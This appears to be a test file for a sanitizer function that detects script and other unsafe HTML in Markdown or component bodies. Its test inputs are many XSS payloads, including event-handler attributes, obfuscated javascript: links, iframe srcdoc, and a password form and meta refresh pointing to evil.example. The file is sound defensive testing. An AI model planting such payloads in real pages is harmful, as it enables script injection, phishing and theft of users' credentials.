import { describe, expect, test } from 'bun:test'
import { scriptInBody } from '../src/unsafe'

describe('scriptInBody', () => {
  test('finds what would run as the site, however the browser tokenizes it', async () => {
    for (const [body, found] of [
      ['Hi <script>alert(1)</script>', 'a <script> tag'],
      ['<script/x>alert(1)</script>', 'a <script> tag'],
      ['<img src="x>" onerror=alert(1)>', 'the attribute onerror'],
      ['a <img alt=">" src=x onerror=alert(1)> b', 'the attribute onerror'],
      ['a <img alt="<" src=x onerror=alert(1)> b', 'the attribute onerror'],
      ['<div/onclick=alert(1)>x', 'the attribute onclick'],
      ['<div>\n<svg/onload=alert(1)>\n</div>', 'a <svg> tag'],
      ['<div>\n<img/src=x onerror=alert(1)>\n</div>', 'the attribute onerror'],
      ['<dIV ONMOUSEOVER="alert(1)">x</dIV>', 'the attribute onmouseover'],
      ['[link](javascript:alert(1))', 'a href running script'],
      ['<a href="&#106;avascript:alert(1)">x</a>', 'a href running script'],
      ['<a href="java\tscript:alert(1)">x</a>', 'a href running script'],
      ['<iframe srcdoc="<script>alert(1)</script>"></iframe>', 'a <iframe> tag'],
      ['<div style="position:fixed;inset:0">fake sign-in</div>', 'the attribute style'],
      ['<form action="https://evil.example"><input name="password"></form>', 'a <form> tag'],
      ['<meta http-equiv="refresh" content="0;url=https://evil.example">', 'a <meta> tag'],
      ['<input type=checkbox disabled style="position:fixed;inset:0">', 'a <input> tag'],
      ['<input type=checkbox disabled onmouseover=alert(1)>', 'a <input> tag'],
      ['<input type=checkbox disabled formaction=javascript:alert(1)>', 'a <input> tag'],
      ['<plaintext>the rest of the page', 'a <plaintext> tag'],
      ['<xmp>the rest of the page', 'a <xmp> tag'],
      ['<noframes>the rest of the page', 'a <noframes> tag'],
      ['<!-- the rest of the page\n\nnever shown', 'a tag left open'],
      ['<div onclick=alert(1)', 'the attribute onclick'],
      ['<div title="x', 'a tag left open'],
      ['Text\n\n<div class="the layout up to its next quote', 'a tag left open'],
    ] as const)
      expect(await scriptInBody(body), body).toBe(found)
  })

  test('keeps Markdown, safe HTML, code showing HTML and the collection\'s own components', async () => {
    for (const body of [
      '# Title\n\nSome **bold** text, a [link](https://example.com) and ![a pixel](data:image/png;base64,iVBORw0KGgo=).',
      '```html\n<script>shown, not run</script>\n```',
      'Inline `<img onerror=x>` code.',
      '<kbd>Ctrl</kbd> and <abbr title="HyperText">HTML</abbr>',
      '- [ ] to do\n- [x] done',
      '<Callout once title="Note">Text</Callout>',
      '<Link href="/a" />',
      'Hi <!-- shown as text',
      '<!-- a note -->\n\nText',
    ])
      expect(await scriptInBody(body), body).toBeUndefined()
  })

  test('still finds script inside a component, or after a brace ending a component tag early', async () => {
    expect(await scriptInBody('<Callout onclick=alert(1)//}>hi')).toBe('the attribute onclick')
    expect(await scriptInBody('<Callout onmouseover=alert(1)//} />')).toBe('the attribute onmouseover')
    expect(await scriptInBody(`<div title='<Callout />' onclick=alert(1)>x</div>`)).toBe('the attribute onclick')
    expect(await scriptInBody(`<img src='x <Callout />' onerror=alert(1)>`)).toBe('the attribute onerror')
    expect(await scriptInBody('<Callout>\n\n<div title="</Callout>" onclick=alert(1)>x</div>')).toBe('the attribute onclick')
    expect(await scriptInBody('<div title="<Callout />">x</div>')).toBe('a component inside a tag')
    expect(await scriptInBody('<!-- <Callout /> <script>alert(1)</script> -->\n\n<kay-component>')).toBe('a component inside a tag')
    expect(await scriptInBody('<Callout>\n\n<!-- </Callout> <script>alert(1)</script> -->')).toBe('a component inside a tag')
    expect(await scriptInBody('<kay-body-end>\n\n<div onmouseover=alert(1) title="x')).toBe('a tag left open')
    expect(await scriptInBody('<Callout title="a"><script>alert(1)</script></Callout>')).toBe('a <script> tag')
  })
})
